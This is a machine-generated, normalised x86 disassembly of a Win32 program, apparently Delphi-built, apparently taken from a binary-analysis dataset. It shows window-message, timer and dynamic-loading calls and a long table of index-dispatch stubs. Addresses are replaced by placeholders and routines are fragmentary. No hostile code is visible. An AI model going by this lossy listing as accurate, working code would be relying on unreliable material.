retn
sub_453324
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_417c34
mov [ ebx + 0x270 ] eax
pop esi
pop ebx
retn
sub_45333c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_453374
mov edx eax
mov eax esi
call sub_4194bc
pop esi
pop ebx
retn
sub_453358
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_454718
mov edx eax
mov eax esi
call sub_4194bc
pop esi
pop ebx
retn
sub_453374
push ebx
mov ebx eax
mov eax ebx
call sub_4543b8
mov edx r-xdata
call sub_41d9b8
pop ebx
retn
sub_453478
push ebx
mov ebx eax
mov eax ebx
call sub_453488
xor al 0x1
pop ebx
retn
sub_453488
cmp [ eax + 0x210 ] 0x0
jne r-xdata
mov al 0x1
retn
mov edx [ eax + 0x208 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax [ eax + 0x20c ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
sub_4534e4
push ebx
cmp [ eax + 0x292 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x294 ]
call [ ebx + 0x290 ]
sub_453504
push ebx
cmp [ eax + 0x2b2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_453524
push ebx
cmp [ eax + 0x2ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_45381d
jmp sub_403858
sub_453824
pop ecx
pop ebp
retn
sub_453828
xor eax eax
retn
sub_453b00
jmp sub_403858
sub_453b07
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403104
retn
sub_453b1d
jmp sub_403858
sub_453c07
jmp sub_403858
sub_453c0e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453c2b
mov eax [ ebp - 0xc ]
call sub_403104
retn
sub_453c24
jmp sub_403858
sub_453c4b
jmp sub_403858
sub_453f36
jmp sub_403858
sub_4540c9
jmp sub_403858
sub_4543b8
mov eax [ eax + 0x238 ]
retn
sub_4543c0
mov eax [ eax + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_4543cc
mov al [ eax + 0x5e ]
xor al 0x1
retn
sub_45470a
jmp sub_403858
sub_454711
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_454718
mov eax [ eax + 0x25c ]
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
sub_454760
cmp dl [ eax + 0x230 ]
je r-xdata
retn
mov [ eax + 0x230 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
call sub_43e0c8
sub_45477c
cmp [ eax + 0x25c ] 0x0
setne al
retn
sub_4547b8
push ebx
mov ebx eax
mov eax ebx
call sub_44005c
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_41d3f4
sub_45483c
push ebx
mov ebx eax
mov eax ebx
call sub_440084
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x68 ]
call sub_41da5c
sub_45485c
push ebx
mov ebx eax
mov eax ebx
call sub_45447c
mov edx [ ebx + 0x248 ]
mov eax ebx
call sub_454544
pop ebx
retn
sub_455089
lea eax [ ebp - 0xb4 ]
call sub_403e54
retn
sub_455095
jmp sub_403858
j_sub_455089
jmp sub_455089
sub_45509c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4551f4
jmp sub_403858
sub_4551fb
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4554e0
jmp sub_403858
sub_4554e7
mov eax [ rw-data ]
call sub_457d98
mov bl 0x1
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4554fe
add [ eax ] al
retn
sub_45575c
push ebx
cmp [ eax + 0x2ba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
sub_45577c
mov eax [ eax + 0x240 ]
call sub_423738
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
call sub_459b38
sub_455823
jmp sub_403858
sub_45582a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45584d
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_41da34
retn
sub_455846
jmp sub_403858
sub_45584d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_455a0c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45577c
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_455c74
mov ecx [ eax + 0x248 ]
test ecx ecx
je r-xdata
retn
mov edx [ edx + 0x4 ]
mov eax ecx
call sub_44da84
sub_455d5f
jmp sub_403858
sub_455d66
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_455d6c
cmp [ eax + 0x22f ] 0x2
jne r-xdata
cmp [ edx + 0x4 ] 0x0
setne dl
call sub_455554
test [ eax + 0x1c ] 0x10
je r-xdata
retn
sub_455dc4
call sub_456aec
retn
sub_456211
jmp sub_403858
sub_456218
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_456514
jmp sub_4035a4
sub_4568b0
jmp sub_4035a4
sub_4569a9
jmp sub_403858
sub_4569b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4569cd
lea eax [ ebp - 0x8 ]
call sub_403e54
retn
sub_4569c6
jmp sub_403858
sub_4569cd
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4569d4
push ebx
mov ebx eax
mov eax [ ebx + 0x240 ]
call sub_423738
test eax eax
jne r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_45341c
sub_4569f4
call sub_403104
retn
sub_456a4c
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_456ab2
jmp sub_403858
sub_456c60
jmp sub_4035a4
sub_456c8c
xor edx edx
call sub_453780
retn
sub_456c94
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_453780
mov eax ebx
call sub_43a5ac
pop ebx
retn
sub_456d1a
jmp sub_403858
sub_456d21
pop ebx
pop ecx
pop ebp
retn
sub_456d28
push ebx
mov ebx eax
push 0x0
push 0x0
push 0xb021
mov eax ebx
call sub_440b28
push eax
call PostMessageA
pop ebx
retn
sub_456f2c
jmp sub_403858
sub_456fcd
jmp sub_403858
sub_456fd7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456ff6
mov eax [ rw-data ]
call sub_459210
retn
sub_456fef
jmp sub_403858
sub_456ff6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457013
lea eax [ ebp - 0x20 ]
call sub_403e54
retn
sub_45700c
jmp sub_403858
sub_457013
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4570f4
cmp [ eax + 0x30 ] 0x0
jne r-xdata
call sub_439758
retn
mov edx eax
mov eax [ rw-data ]
call sub_458864
retn
sub_457478
mov edx eax
mov eax [ rw-data ]
call sub_45a284
mov al 0x1
retn
sub_457560
cmp dl [ eax + 0x2e0 ]
je r-xdata
retn
mov [ eax + 0x2e0 ] dl
call sub_457488
sub_457574
cmp dl [ eax + 0x2e1 ]
je r-xdata
retn
mov [ eax + 0x2e1 ] dl
call sub_457488
sub_457588
cmp edx [ eax + 0x2ec ]
je r-xdata
retn
mov [ eax + 0x2ec ] edx
call sub_457488
sub_45759c
cmp dl [ eax + 0x2e8 ]
je r-xdata
retn
mov [ eax + 0x2e8 ] dl
call sub_457488
sub_4575b0
test [ eax + 0x1c ] 0x10
jne r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ eax + 0x2e0 ] 0x0
jne r-xdata
or [ edx + 0x8 ] 0x80000
cmp [ eax + 0x2e8 ] 0x0
je r-xdata
sub_45771b
jmp sub_403858
sub_457722
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_457728
push ebx
mov ebx eax
mov eax ebx
call sub_43f440
mov eax ebx
call sub_43f5c4
test eax eax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_456d28
sub_45799e
jmp sub_403858
sub_4579a5
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4579ac
push ebx
mov ebx edx
mov edx ebx
call sub_43f8a8
mov eax [ ebx + 0x8 ]
xor edx edx
call sub_439860
pop ebx
retn
sub_457a00
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_457a68
mov eax [ esp ]
add esp 0x10
pop ebx
retn
sub_457a18
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_457a68
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_457a34
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_457a68
mov eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_457a4c
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_457a68
mov eax [ esp + 0x8 ]
sub eax [ esp ]
add esp 0x10
pop ebx
retn
sub_457ce8
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_457cf4
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_457d00
push 0x4d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_457d0c
push 0x4c
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_457d18
push 0x4f
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_457d24
push 0x4e
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_457d30
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x58 ]
call sub_413d6c
pop esi
pop ebx
retn
sub_457d44
mov edx [ eax + 0x58 ]
mov edx [ edx + 0x8 ]
test edx edx
jne r-xdata
mov eax edx
retn
push 0x50
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_457d60
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_413d6c
pop esi
pop ebx
retn
sub_457d74
mov eax [ eax + 0x4c ]
mov eax [ eax + 0x8 ]
retn
sub_457d7c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_413d6c
pop esi
pop ebx
retn
sub_457d90
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
retn
sub_457e6c
mov eax [ eax + 0x54 ]
call sub_413c10
retn
sub_457e78
mov eax [ eax + 0x54 ]
call sub_413eb0
retn
sub_4580cb
jmp sub_403858
sub_45810f
jmp sub_403858
sub_458116
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_458164
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_457f64
mov eax esi
mov edx [ ebx + 0x38 ]
call sub_403ea8
pop esi
pop ebx
retn
sub_4581d0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x54 ]
call sub_413d6c
pop esi
pop ebx
retn
sub_4581e4
mov eax [ eax + 0x54 ]
mov eax [ eax + 0x8 ]
retn
sub_4583e9
jmp sub_403858
sub_4583f0
pop ebx
mov esp ebp
pop ebp
retn
sub_4583f8
inc [ eax + 0x8c ]
retn
sub_458400
dec [ eax + 0x8c ]
cmp [ eax + 0x8c ] 0x0
jne r-xdata
retn
test [ eax + 0x8e ] 0x10
je r-xdata
call sub_458420
sub_458420
xor edx edx
call sub_458864
retn
sub_458856
jmp sub_403858
sub_4588dd
jmp sub_403858
sub_4588ec
add eax 0x30
call sub_40d078
retn
sub_458930
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x99 ] 0x0
je r-xdata
retn
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ eax + 0x30 ]
xor eax eax
sub_458981
jmp sub_4035a4
sub_458986
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_45a284
call sub_40390c
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_459055
jmp sub_403858
sub_45905c
pop ebx
mov esp ebp
pop ebp
retn
sub_4591e4
push ebx
inc [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x1
jne r-xdata
pop ebx
retn
cmp [ eax + 0xe2 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_459210
push ebx
dec [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0xea ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_45923c
xor edx edx
call sub_459134
retn
sub_459244
mov dl 0x1
call sub_459134
retn
sub_4592b8
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_4592d0
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x1
je r-xdata
mov al 0x1
retn
sub_45939d
jmp sub_403858
sub_4593a4
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_459aee
jmp sub_4035a4
sub_45a0ec
push ebx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop ebx
retn
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
sub_45a142
jmp sub_4035a4
sub_45a229
jmp sub_4035a4
sub_45a262
jmp sub_403858
sub_45a269
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45a270
call sub_40cbc8
test al al
je r-xdata
retn
push 0x0
call PostQuitMessage
sub_45a469
jmp sub_403858
sub_45a470
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45a537
jmp sub_403858
sub_45a53e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45a714
jmp sub_403858
sub_45a71b
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45a77c
jmp sub_403858
sub_45a783
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45a78c
call sub_45a554
retn
sub_45a977
jmp sub_4035a4
sub_45a9d0
jmp sub_403858
sub_45a9d7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45ab05
jmp sub_403858
sub_45ac64
push ebx
mov ebx eax
mov ax [ ebx + 0x8a ]
test ax ax
je r-xdata
pop ebx
retn
movzx eax ax
push eax
push 0x0
call KillTimer
mov [ ebx + 0x8a ] 0x0
sub_45af63
jmp sub_403858
sub_45af92
jmp sub_403858
sub_45b09e
jmp sub_403858
sub_45b0a5
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45b436
jmp sub_403858
sub_45b43d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45b560
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_45b5ab
add [ edx ] ch
push 0x0
push 0x0
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
retn
sub_45b5bc
mov edx [ rw-data ]
mov [ edx + 0x4 ] eax
mov [ edx ] r-xdata
retn
sub_45b5cc
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
retn
sub_45b63f
jmp sub_403858
sub_45b646
pop ebp
retn
sub_45b648
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_45b5dc
call sub_403c28
call sub_45b560
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
mov eax sub_451314
call sub_413860
sub_45b819
jmp sub_403858
sub_45b820
pop ebp
retn
sub_45b824
sub [ rw-data ] 0x1
retn
sub_45ba29
jmp sub_403858
sub_45ba30
pop ebp
retn
sub_45ba34
sub [ rw-data ] 0x1
retn
sub_45bb54
jmp sub_403858
sub_45bb8c
push 0x0
push rw-data
call InterlockedExchange
test eax eax
je r-xdata
retn
push eax
call FreeLibrary
call sub_45c9ec
sub_45bba8
mov eax 0x0
call sub_45c938
jmp eax
sub_45bbb4
retn
sub_45bbb8
mov eax 0x1
call sub_45c938
jmp eax
sub_45bbc4
retn
sub_45bbc8
mov eax 0x2
call sub_45c938
jmp eax
sub_45bbd4
retn
sub_45bbd8
mov eax 0x3
call sub_45c938
jmp eax
sub_45bbe4
retn
sub_45bbe8
mov eax 0x4
call sub_45c938
jmp eax
sub_45bbf4
retn
sub_45bbf8
mov eax 0x5
call sub_45c938
jmp eax
sub_45bc04
retn
sub_45bc08
mov eax 0x6
call sub_45c938
jmp eax
sub_45bc14
retn
sub_45bc18
mov eax 0x7
call sub_45c938
jmp eax
sub_45bc24
retn
sub_45bc28
mov eax 0x8
call sub_45c938
jmp eax
sub_45bc34
retn
sub_45bc38
mov eax 0x9
call sub_45c938
jmp eax
sub_45bc44
retn
sub_45bc48
mov eax 0xa
call sub_45c938
jmp eax
sub_45bc54
retn
sub_45bc58
mov eax 0xb
call sub_45c938
jmp eax
sub_45bc64
retn
sub_45bc68
mov eax 0xc
call sub_45c938
jmp eax
sub_45bc74
retn
sub_45bc78
mov eax 0xd
call sub_45c938
jmp eax
sub_45bc84
retn
sub_45bc88
mov eax 0xe
call sub_45c938
jmp eax
sub_45bc94
retn
sub_45bc98
mov eax 0xf
call sub_45c938
jmp eax
sub_45bca4
retn
sub_45bca8
mov eax 0x10
call sub_45c938
jmp eax
sub_45bcb4
retn
sub_45bcb8
mov eax 0x11
call sub_45c938
jmp eax
sub_45bcc4
retn
sub_45bcc8
mov eax 0x12
call sub_45c938
jmp eax
sub_45bcd4
retn
sub_45bcd8
mov eax 0x13
call sub_45c938
jmp eax
sub_45bce4
retn
sub_45bce8
mov eax 0x14
call sub_45c938
jmp eax
sub_45bcf4
retn
sub_45bcf8
mov eax 0x15
call sub_45c938
jmp eax
sub_45bd04
retn
sub_45bd08
mov eax 0x16
call sub_45c938
jmp eax
sub_45bd14
retn
sub_45bd18
mov eax 0x17
call sub_45c938
jmp eax
sub_45bd24
retn
sub_45bd28
mov eax 0x18
call sub_45c938
jmp eax
sub_45bd34
retn
sub_45bd38
mov eax 0x19
call sub_45c938
jmp eax
sub_45bd44
retn
sub_45bd48
mov eax 0x1a
call sub_45c938
jmp eax
sub_45bd54
retn
sub_45bd58
mov eax 0x1b
call sub_45c938
jmp eax
sub_45bd64
retn
sub_45bd68
mov eax 0x1c
call sub_45c938
jmp eax
sub_45bd74
retn
sub_45bd78
mov eax 0x1d
call sub_45c938
jmp eax
sub_45bd84
retn
sub_45bd88
mov eax 0x1e
call sub_45c938
jmp eax
sub_45bd94
retn
sub_45bd98
mov eax 0x1f
call sub_45c938
jmp eax
sub_45bda4
retn
sub_45bda8
mov eax 0x20
call sub_45c938
jmp eax
sub_45bdb4
retn
sub_45bdb8
mov eax 0x21
call sub_45c938
jmp eax
sub_45bdc4
retn
sub_45bdc8
mov eax 0x22
call sub_45c938
jmp eax
sub_45bdd4
retn
sub_45bdd8
mov eax 0x23
call sub_45c938
jmp eax
sub_45bde4
retn
sub_45bde8
mov eax 0x24
call sub_45c938
jmp eax
sub_45bdf4
retn
sub_45bdf8
mov eax 0x25
call sub_45c938
jmp eax
sub_45be04
retn
sub_45be08
mov eax 0x26
call sub_45c938
jmp eax
sub_45be14
retn
sub_45be18
mov eax 0x27
call sub_45c938
jmp eax
sub_45be24
retn
sub_45be28
mov eax 0x28
call sub_45c938
jmp eax
sub_45be34
retn
sub_45be38
mov eax 0x29
call sub_45c938
jmp eax
sub_45be44
retn
sub_45be48
mov eax 0x2a
call sub_45c938
jmp eax
sub_45be54
retn
sub_45be58
mov eax 0x2b
call sub_45c938
jmp eax
sub_45be64
retn
sub_45be68
mov eax 0x2c
call sub_45c938
jmp eax
sub_45be74
retn
sub_45be78
mov eax 0x2d
call sub_45c938
jmp eax
sub_45be84
retn
sub_45be88
mov eax 0x2e
call sub_45c938
jmp eax
sub_45be94
retn
sub_45be98
mov eax 0x2f
call sub_45c938
jmp eax
sub_45bea4
retn
sub_45bea8
mov eax 0x30
call sub_45c938
jmp eax
sub_45beb4
retn
sub_45beb8
mov eax 0x31
call sub_45c938
jmp eax
sub_45bec4
retn
sub_45bec8
mov eax 0x32
call sub_45c938
jmp eax
sub_45bed4
retn
sub_45bed8
mov eax 0x33
call sub_45c938
jmp eax
sub_45bee4
retn
sub_45bee8
mov eax 0x34
call sub_45c938
jmp eax
sub_45bef4
retn
sub_45bef8
mov eax 0x35
call sub_45c938
jmp eax
sub_45bf04
retn
sub_45bf08
mov eax 0x36
call sub_45c938
jmp eax
sub_45bf14
retn
sub_45bf18
mov eax 0x37
call sub_45c938
jmp eax
sub_45bf24
retn
sub_45bf28
mov eax 0x38
call sub_45c938
jmp eax
sub_45bf34
retn
sub_45bf38
mov eax 0x39
call sub_45c938
jmp eax
sub_45bf44
retn
sub_45bf48
mov eax 0x3a
call sub_45c938
jmp eax
sub_45bf54
retn
sub_45bf58
mov eax 0x3b
call sub_45c938
jmp eax
sub_45bf64
retn
sub_45bf68
mov eax 0x3c
call sub_45c938
jmp eax
sub_45bf74
retn
sub_45bf78
mov eax 0x3d
call sub_45c938
jmp eax
sub_45bf84
retn
sub_45bf88
mov eax 0x3e
call sub_45c938
jmp eax
sub_45bf94
retn
sub_45bf98
mov eax 0x3f
call sub_45c938
jmp eax
sub_45bfa4
retn
sub_45bfa8
mov eax 0x40
call sub_45c938
jmp eax
sub_45bfb4
retn
sub_45bfb8
mov eax 0x41
call sub_45c938
jmp eax
sub_45bfc4
retn
sub_45bfc8
mov eax 0x42
call sub_45c938
jmp eax
sub_45bfd4
retn
sub_45bfd8
mov eax 0x43
call sub_45c938
jmp eax
sub_45bfe4
retn
sub_45bfe8
mov eax 0x44
call sub_45c938
jmp eax
sub_45bff4
retn
sub_45bff8
mov eax 0x45
call sub_45c938
jmp eax
sub_45c004
retn
sub_45c008
mov eax 0x46
call sub_45c938
jmp eax
sub_45c014
retn
sub_45c018
mov eax 0x47
call sub_45c938
jmp eax
sub_45c024
retn
sub_45c028
mov eax 0x48
call sub_45c938
jmp eax
sub_45c034
retn
sub_45c038
mov eax 0x49
call sub_45c938
jmp eax
sub_45c044
retn
sub_45c048
mov eax 0x4a
call sub_45c938
jmp eax
sub_45c054
retn
sub_45c058
mov eax 0x4b
call sub_45c938
jmp eax
sub_45c064
retn
sub_45c068
mov eax 0x4c
call sub_45c938
jmp eax
sub_45c074
retn
sub_45c078
mov eax 0x4d
call sub_45c938
jmp eax
sub_45c084
retn
sub_45c088
mov eax 0x4e
call sub_45c938
jmp eax
sub_45c094
retn
sub_45c098
mov eax 0x4f
call sub_45c938
jmp eax
sub_45c0a4
retn
sub_45c0a8
mov eax 0x50
call sub_45c938
jmp eax
sub_45c0b4
retn
sub_45c0b8
mov eax 0x51
call sub_45c938
jmp eax
sub_45c0c4
retn
sub_45c0c8
mov eax 0x52
call sub_45c938
jmp eax
sub_45c0d4
retn
sub_45c0d8
mov eax 0x53
call sub_45c938
jmp eax
sub_45c0e4
retn
sub_45c0e8
mov eax 0x54
call sub_45c938
jmp eax
sub_45c0f4
retn
sub_45c0f8
mov eax 0x55
call sub_45c938
jmp eax
sub_45c104
retn
sub_45c108
mov eax 0x56
call sub_45c938
jmp eax
sub_45c114
retn
sub_45c118
mov eax 0x57
call sub_45c938
jmp eax
sub_45c124
retn
sub_45c128
mov eax 0x58
call sub_45c938
jmp eax
sub_45c134
retn
sub_45c138
mov eax 0x59
call sub_45c938
jmp eax
sub_45c144
retn
sub_45c148
mov eax 0x5a
call sub_45c938
jmp eax
sub_45c154
retn
sub_45c158
mov eax 0x5b
call sub_45c938
jmp eax
sub_45c164
retn
sub_45c168
mov eax 0x5c
call sub_45c938
jmp eax
sub_45c174
retn
sub_45c178
mov eax 0x5d
call sub_45c938
jmp eax
sub_45c184
retn
sub_45c188
mov eax 0x5e
call sub_45c938
jmp eax
sub_45c194
retn
sub_45c198
mov eax 0x5f
call sub_45c938
jmp eax
sub_45c1a4
retn
sub_45c1a8
mov eax 0x60
call sub_45c938
jmp eax
sub_45c1b4
retn
sub_45c1b8
mov eax 0x61
call sub_45c938
jmp eax
sub_45c1c4
retn
sub_45c1c8
mov eax 0x62
call sub_45c938
jmp eax
sub_45c1d4
retn
sub_45c1d8
mov eax 0x63
call sub_45c938
jmp eax
sub_45c1e4
retn
sub_45c1e8
mov eax 0x64
call sub_45c938
jmp eax
sub_45c1f4
retn
sub_45c1f8
mov eax 0x65
call sub_45c938
jmp eax
sub_45c204
retn
sub_45c208
mov eax 0x66
call sub_45c938
jmp eax
sub_45c214
retn
sub_45c218
mov eax 0x67
call sub_45c938
jmp eax
sub_45c224
retn
sub_45c228
mov eax 0x68
call sub_45c938
jmp eax
sub_45c234
retn
sub_45c238
mov eax 0x69
call sub_45c938
jmp eax
sub_45c244
retn
sub_45c248
mov eax 0x6a
call sub_45c938
jmp eax
sub_45c254
retn
sub_45c258
mov eax 0x6b
call sub_45c938
jmp eax
sub_45c264
retn
sub_45c268
mov eax 0x6c
call sub_45c938
jmp eax
sub_45c274
retn
sub_45c278
mov eax 0x6d
call sub_45c938
jmp eax
sub_45c284
retn
sub_45c288
mov eax 0x6e
call sub_45c938
jmp eax
sub_45c294
retn
sub_45c298
mov eax 0x6f
call sub_45c938
jmp eax
sub_45c2a4
retn
sub_45c9db
jmp sub_403858
sub_45c9e2
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45cadd
jmp sub_403858
sub_45cae4
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_45cb48
jmp sub_403858
sub_45cb4f
pop ebp
retn
sub_45cb54
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_45c9ec
sub_45cb89
jmp sub_403858
sub_45cb90
pop ebp
retn
sub_45cb94
sub [ rw-data ] 0x1
retn
sub_45ce20
push 0xffffffff
lea ecx [ esp + 0x4 ]
call sub_45ce2c
retn
sub_45cec6
jmp sub_403858
sub_45cecd
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45ced4
test dl dl
je r-xdata
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403428
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_45d2ee
jmp sub_403858
sub_45d2f5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45d374
jmp sub_403858
sub_45d37b
mov eax [ ebp - 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45d3a9
jmp sub_403858
sub_45d3b0
pop ebp
retn
sub_45d3b4
sub [ rw-data ] 0x1
retn
sub_45d5ae
jmp sub_403858
sub_45d5b5
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403480
pop [ fs : 0x0 ]
add esp 0xc
sub_45d690
jmp sub_403858
sub_45d697
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45d72b
jmp sub_403858
sub_45d732
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45d7a8
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45d8ec
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45d99f
jmp sub_403858
sub_45d9a6
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_45da81
jmp sub_403858
sub_45da88
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45dc74
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45dc80
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0x4
sub_45dc98
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45dca4
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
j_sub_4036d0#3
jmp sub_4036d0
sub_45dd7d
jmp sub_403858
sub_45dd84
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45de72
jmp sub_4035a4
sub_45dead
jmp sub_403858
sub_45deb4
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45dec0
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45decc
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45df72
jmp sub_403858
sub_45df79
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45e035
jmp sub_403858
sub_45e03c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e059
lea eax [ ebp - 0x4 ]
call sub_403e54
retn
sub_45e052
jmp sub_403858
sub_45e059
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_45e127
jmp sub_403858
sub_45e12e
pop ebx
mov esp ebp
